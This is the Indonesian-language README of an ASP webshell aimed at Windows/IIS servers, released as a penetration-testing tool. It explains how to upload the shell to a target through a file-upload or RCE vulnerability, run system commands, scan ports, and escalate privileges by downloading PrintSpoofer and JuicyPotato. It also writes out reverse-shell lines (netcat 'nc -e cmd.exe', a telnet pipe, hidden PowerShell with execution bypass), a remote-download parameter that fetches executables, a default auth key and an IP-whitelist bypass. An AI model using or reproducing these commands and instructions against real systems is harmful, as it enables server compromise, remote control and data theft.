```markdown
# 🐍 SERPENTECHUNTER v2.1 – ASP ULTIMATE WEBSHELL

**WebShell ASP untuk Windows/IIS – Security Testing & Penetration Testing**

![ASP](https://img.shields.io/badge/ASP-VBScript-blueviolet?style=flat-square&logo=windows)
![Version](https://img.shields.io/badge/version-2.1-brightgreen?style=flat-square)
![Developer](https://img.shields.io/badge/Developer-SerpentSecHunter-orange?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-red?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20IIS-blue?style=flat-square)

---

## 📌 Tentang

**SERPENTECHUNTER v2.1** adalah WebShell ASP (VBScript) yang dirancang untuk **security testing** dan **penetration testing** pada server **Windows/IIS**. Shell ini merupakan versi ASP dari [SERPENTECHUNTER PHP](https://github.com/SerpentSecHunter2006/WEB-SHELL) dengan fitur yang **setara** – hanya disesuaikan dengan platform Windows.

Shell ini menggabungkan fitur-fitur dari WebShell ASP terkenal seperti **r57 ASP**, **b374k ASP**, dan **AspWebShell**, dengan tambahan fitur modern seperti **bypass komponen**, **wildcard IP whitelist**, **multi-method reverse shell**, dan **exploit engine** untuk privilege escalation.

> ⚠️ **Disclaimer:** Tools ini hanya untuk tujuan edukasi dan pengujian keamanan yang sah (authorized penetration testing). Penggunaan untuk aktivitas ilegal adalah tanggung jawab pengguna sepenuhnya.

---

## 🔥 Fitur Unggulan

| Fitur | Deskripsi |
|-------|-----------|
| **🛡️ Stealth Engine** | Menyembunyikan identitas server dengan spoofing header (`Server`, `X-Powered-By`) dan error handling |
| **🔐 Authentication** | Multi-layer auth (Cookie + IP Whitelist Wildcard + GET Parameter) |
| **⚡ Command Execution** | 3 strategi: `WScript.Shell`, `Shell.Application`, `WMI (Win32_Process)` dengan fallback otomatis |
| **📁 File Manager Ultimate** | List, Read, Write, Delete, Rename, Chmod (via `attrib`), Search (recursive) |
| **📋 Mass Actions** | Delete, Rename, Copy, Move multiple files/folders sekaligus (checkbox) |
| **📤 Upload & Download** | Upload via POST form (multipart/form-data), Download local file, Remote Download via HTTP (MSXML2/WinHttp) |
| **🌐 Reverse Shell** | 3 metode sekaligus (PowerShell, Netcat, Telnet) – dijalankan di background |
| **🔍 Port Scanner** | TCP Connect scanner dengan multi-format port support (XMLHTTP + WinHttp fallback) |
| **🗄️ Database Client** | Support MSSQL (SQLNCLI11) dan Microsoft Access (Jet OLEDB) |
| **🔥 Exploit Engine** | PrintSpoofer, JuicyPotato – privilege escalation otomatis di Windows |
| **🔍 Vulnerability Check** | Deteksi OS, versi Windows, dan cek privilege `SeImpersonatePrivilege` |
| **🎨 UI Responsive** | Tampilan blackhat theme yang mobile-friendly, Toast Notification, Select All |
| **🔑 Wildcard IP** | Support IP whitelist dengan wildcard (`%`) dan CIDR (`/24`) |

---

## 📂 Fitur File Manager

| Aksi | Cara Pakai |
|------|------------|
| **List Directory** | Otomatis tampil di panel kiri |
| **Edit File** | Klik ✏️ → edit → SAVE |
| **View File** | Klik 👁️ → lihat isi |
| **Delete Single** | Klik 🗑️ → confirm |
| **Delete Mass** | Checkbox → DELETE SELECTED → confirm |
| **Rename Single** | Klik 📝 → input new name |
| **Rename Mass** | Checkbox → RENAME → input new names |
| **Copy Mass** | Checkbox → COPY → input destination |
| **Move Mass** | Checkbox → MOVE → input destination |
| **Search** | Input pattern → 🔍 SEARCH |
| **Upload** | Pilih file → ⬆ UPLOAD |
| **Zip Folder** | Input folder & zipname → 📦 ZIP |
| **Unzip File** | Input file.zip & dest → 📂 UNZIP |

---

## 🔍 Command Execution

Shell ini menggunakan **3 strategi** untuk mengeksekusi perintah sistem:

| Strategi | Objek | Keunggulan |
|----------|-------|------------|
| **1** | `WScript.Shell` | `.Exec()` – paling stabil, output lengkap |
| **2** | `Shell.Application` | `.ShellExecute()` – fallback jika WScript.Shell diblokir |
| **3** | `WMI` | `Win32_Process.Create()` – paling stealth, susah dideteksi |

**Cara Pakai:** Isi kolom `💀 Command...` dengan perintah (contoh: `whoami`, `ipconfig`, `dir C:\`), lalu klik **▶ EXEC**.

---

## 🌐 Reverse Shell

Shell menjalankan **3 metode reverse shell sekaligus** di background.

### Persiapan Listener (di komputer attacker):
```bash
# Untuk PowerShell/Netcat
nc -lvnp 4444

# Untuk Telnet (port kedua)
nc -lvnp 4445
```

### Eksekusi Reverse Shell:
```
?action=reverse&ip=1.2.3.4&port=4444
```

### Metode yang Didukung:

| Metode | Command | Port |
|--------|---------|------|
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."` | `port` |
| **Netcat** | `nc -e cmd.exe 1.2.3.4 4444` | `port` |
| **Telnet** | `telnet 1.2.3.4 4444 \| cmd \| telnet 1.2.3.4 4445` | `port` & `port+1` |

> Semua metode berjalan di background (`WScript.Shell.Run` dengan `0`), sehingga tidak membuat halaman hang.

---

## 🔥 Exploit Engine (Windows)

Shell ini memiliki fitur **Exploit Engine** untuk privilege escalation di Windows:

| Exploit | Deskripsi | Target |
|---------|-----------|--------|
| **PrintSpoofer** | Privilege escalation via `SeImpersonatePrivilege` | Windows 10/11, Server 2016/2019/2022 |
| **JuicyPotato** | Token Impersonation | Windows Server 2016/2019/2022 (fallback) |
| **Auto Exploit** | Otomatis coba PrintSpoofer terlebih dahulu | - |

### Cara Pakai Exploit Engine:

1. Klik **"🔍 CHECK VULN"** → deteksi OS dan privilege `SeImpersonatePrivilege`
2. Jika `SeImpersonatePrivilege` **Enabled**, pilih exploit di dropdown:
   - `AUTO` → otomatis pilih terbaik
   - `PrintSpoofer` → download & run PrintSpoofer.exe
   - `JuicyPotato` → download & run JuicyPotato.exe
3. Klik **"🔥 RUN"** → exploit dijalankan otomatis
4. Output muncul di panel kanan

---

## 🔍 Port Scanner

Support multi-format port input:

```bash
# Range port
?action=portscan&host=127.0.0.1&ports=1-100

# Multiple port
?action=portscan&host=127.0.0.1&ports=22,80,443

# Kombinasi
?action=portscan&host=127.0.0.1&ports=1-100,443,8080
```

**Metode Scanning:**
1. **XMLHTTP** → deteksi port terbuka via HTTP request (cepat)
2. **WinHttp (fallback)** → jika XMLHTTP tidak tersedia

---

## 🗄️ Database Client

Support 2 jenis database di Windows:

### MSSQL (SQL Server)
```bash
?action=db&dbtype=mssql&dbserver=localhost&dbname=master&dbuser=sa&dbpass=password
```
Menggunakan provider `SQLNCLI11` (SQL Server Native Client).

### Microsoft Access
```bash
?action=db&dbtype=access&dbserver=C:\database.mdb
```
Menggunakan provider `Microsoft.Jet.OLEDB.4.0`.

---

## 🔐 Authentication

| Metode | Deskripsi |
|--------|-----------|
| **Cookie** | `sc_auth` – bertahan 1 tahun |
| **GET Parameter** | `?auth=SERPENTECHUNTER666` |
| **IP Whitelist** | Support wildcard (`%`) dan CIDR (`/24`) |
| **Bypass IP** | `?bypass_ip=1` |

**Ubah AUTH_KEY:**
```vbscript
AUTH_KEY = "YOUR_CUSTOM_KEY_HERE"
```

**Tambah IP Whitelist:**
```vbscript
whitelist = Array("127.0.0.1", "::1", "192.168.1.%", "10.0.0.0/8")
```

---

## 🚀 Cara Penggunaan

### 1. Upload Shell
Upload file `shell.asp` ke server target melalui vulnerability (File Upload, RCE, dll) pada server **Windows dengan IIS**.

### 2. Akses & Login
```
http://target.com/path/shell.asp?auth=SERPENTECHUNTER666
```
Setelah login, cookie akan tersimpan selama 1 tahun.

### 3. Parameter & Perintah

| Parameter | Fungsi | Contoh |
|-----------|--------|--------|
| `action=exec` | Execute command | `?action=exec&cmd=whoami` |
| `action=file` | File Manager | `?action=file&cmd=list&target=C:\` |
| `action=reverse` | Reverse Shell | `?action=reverse&ip=1.2.3.4&port=4444` |
| `action=portscan` | Port Scanner | `?action=portscan&host=127.0.0.1&ports=1-100` |
| `action=db` | Database Client | `?action=db&dbtype=mssql&dbserver=localhost&dbname=master&dbuser=sa&dbpass=pass` |
| `action=upload` | Upload File (POST) | `?action=upload&path=C:\temp` (gunakan form) |
| `action=download` | Download File | `?action=download&path=C:\file.txt` |
| `action=remotedownload` | Remote Download | `?action=remotedownload&url=http://x.com/p.exe&savepath=C:\p.exe` |
| `action=exploit_check` | Check Vulnerabilities | `?action=exploit_check` |
| `action=exploit_run` | Run Exploit | `?action=exploit_run&type=auto` |
| `action=zip` | Create ZIP Archive | `?action=zip&folder=C:\folder&zipname=backup` |
| `action=unzip` | Extract ZIP Archive | `?action=unzip&file=C:\backup.zip&dest=C:\extract` |

### 4. Bypass IP Whitelist
Jika IP Anda tidak terdaftar di whitelist:
```
?bypass_ip=1
```

---

## ⚙️ Teknologi

| Komponen | Deskripsi |
|----------|-----------|
| **VBScript** | Classic ASP |
| **HTML5 + CSS3** | Responsive UI |
| **IIS** | Microsoft Internet Information Services |
| **Komponen** | `WScript.Shell`, `Shell.Application`, `FileSystemObject`, `ADODB.Stream`, `MSXML2.ServerXMLHTTP`, `WinHttp.WinHttpRequest`, `ADODB.Connection` |

---

## 📊 Kelebihan & Kekurangan

### ✅ Kelebihan

| No | Kelebihan |
|----|-----------|
| 1 | **Multi-strategy Command Execution** – 3 strategi (WScript.Shell, Shell.Application, WMI) dengan fallback otomatis |
| 2 | **Stealth Engine** – Bypass 403/404 dengan spoofing header dan error handling |
| 3 | **Reverse Shell Multi-Method** – 3 metode sekaligus (PowerShell, Netcat, Telnet) di background |
| 4 | **File Manager Lengkap** – List, Read, Write, Delete, Rename, Chmod, Search (recursive) |
| 5 | **Mass Actions** – Delete, Rename, Copy, Move multiple files sekaligus |
| 6 | **Exploit Engine** – PrintSpoofer dan JuicyPotato untuk privilege escalation |
| 7 | **Wildcard IP Whitelist** – Support wildcard (`%`) dan CIDR (`/24`) |
| 8 | **Database Client** – Support MSSQL dan Microsoft Access |
| 9 | **Port Scanner** – Multi-format port support dengan fallback |
| 10 | **UI Responsive** – Mobile-friendly blackhat theme dengan Toast Notification |

### ❌ Kekurangan

| No | Kekurangan |
|----|------------|
| 1 | **Platform Terbatas** – Hanya berjalan di server **Windows/IIS** dengan ASP support |
| 2 | **Tergantung Komponen** – Membutuhkan komponen seperti `WScript.Shell`, `FileSystemObject`, `ADODB.Stream` yang mungkin di-disable oleh admin |
| 3 | **Authentication Sederhana** – Menggunakan plaintext AUTH_KEY di cookie (bukan hash) |
| 4 | **Rentan Deteksi** – Meskipun ada stealth engine, shell tetap bisa terdeteksi oleh AV/EDR modern |
| 5 | **Tidak Ada Persistence** – Harus upload ulang jika server di-restart atau file dihapus |
| 6 | **Koneksi Internet** – Exploit engine membutuhkan koneksi internet untuk mendownload payload dari GitHub |

---

## 🔧 Instalasi IIS

### Cara 1: Install IIS dengan DISM (Command Line)
```cmd
dism /online /enable-feature /featurename:IIS-WebServerRole /all
dism /online /enable-feature /featurename:IIS-WebServer /all
dism /online /enable-feature /featurename:IIS-CommonHttpFeatures /all
dism /online /enable-feature /featurename:IIS-HttpErrors /all
dism /online /enable-feature /featurename:IIS-ApplicationDevelopment /all
dism /online /enable-feature /featurename:IIS-ASP /all
dism /online /enable-feature /featurename:IIS-ISAPIExtensions /all
dism /online /enable-feature /featurename:IIS-ISAPIFilter /all
dism /online /enable-feature /featurename:IIS-ManagementConsole /all
iisreset
```

### Cara 2: Install IIS via GUI
1. Control Panel → Programs → Turn Windows features on or off
2. Centang **Internet Information Services**
3. Expand → **World Wide Web Services** → **Application Development Features** → centang **ASP**
4. Klik OK, tunggu instalasi, lalu restart IIS (`iisreset`)

### Setting ASP di IIS
1. Buka **IIS Manager** (`Win + R` → `inetmgr`)
2. Klik **Default Web Site** → double-click **ASP**
3. **Behavior** → **Enable Parent Paths** = `True`
4. **Compilation** → **Debugging Properties** → **Send Errors To Browser** = `True`
5. Klik **Apply** → restart IIS

---

## 📝 Changelog

### v2.1 (02-07-2026)
- ✅ Exploit Engine (PrintSpoofer, JuicyPotato, Auto Exploit)
- ✅ Mass Actions (Delete, Rename, Copy, Move)
- ✅ Select All / Deselect All
- ✅ Toast Notification
- ✅ UI Responsive
- ✅ OS & Privilege Detection
- ✅ Zip/Unzip
- ✅ Remote Download
- ✅ Bug Fixed: `file.Permissions` → `file.Attributes`
- ✅ Bug Fixed: `WScript.Sleep` → `ping`
- ✅ Bug Fixed: `GetTempFileName` dideklarasikan sebelum dipanggil

### v1.0 (02-07-2026)
- Initial release – ASP Ultimate Webshell
- Command Execution (WScript.Shell, Shell.Application, WMI)
- File Manager (List/Read/Write/Delete/Rename/Search/Chmod)
- Upload & Download (Local + Remote)
- Reverse Shell (PowerShell + Netcat + Telnet)
- Port Scanner
- Database Client (MSSQL + Access)
- IP Whitelist (Wildcard `%` + CIDR `/24`)
- Stealth Engine
- UI Responsive

---

## 📊 Perbandingan dengan Versi PHP

| Fitur | PHP v2.1 | ASP v2.1 |
|-------|----------|----------|
| Stealth Engine | ✅ | ✅ |
| Authentication | ✅ | ✅ |
| Command Execution | 4 metode | 3 metode |
| File Manager | ✅ | ✅ |
| Mass Actions | ✅ | ✅ |
| Upload & Download | ✅ | ✅ |
| Reverse Shell | 7 metode | 3 metode |
| Port Scanner | ✅ | ✅ |
| Database Client | MySQL, PgSQL, SQLite | MSSQL, Access |
| Exploit Engine | Linux (PwnKit, Dirty Cow, Dirty Pipe) | Windows (PrintSpoofer, JuicyPotato) |
| UI | ✅ | ✅ |

---

## ⚖️ Lisensi

**MIT License** – Silakan gunakan, modifikasi, dan distribusikan dengan mencantumkan kredit kepada developer.

```
MIT License

Copyright (c) 2026 SerpentSecHunter

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
...
```

---

## 👨‍💻 Developer

**SerpentSecHunter**
- GitHub: [SerpentSecHunter2006](https://github.com/SerpentSecHunter2006)
- Rilis: 02-07-2026

---

## ⭐ Support

Jika Anda menyukai project ini, berikan **star** ⭐ di GitHub dan **fork** untuk mendukung pengembangan lebih lanjut!

---

## ⚠️ Disclaimer

> **Peringatan:** Tools ini dibuat untuk tujuan **edukasi** dan **pengujian keamanan** yang sah (authorized penetration testing). Penggunaan tools ini untuk aktivitas ilegal, hacking tanpa izin, atau merusak sistem orang lain adalah **TINDAKAN PIDANA** dan sepenuhnya menjadi **tanggung jawab pengguna**. Developer tidak bertanggung jawab atas penyalahgunaan tools ini.

---

**🐍 SERPENTECHUNTER v2.1** 😈

---

## 🔗 Repository Lain

- [WEB-SHELL (PHP Version)](https://github.com/SerpentSecHunter2006/WEB-SHELL) – PHP version dengan Exploit Engine untuk Linux
```
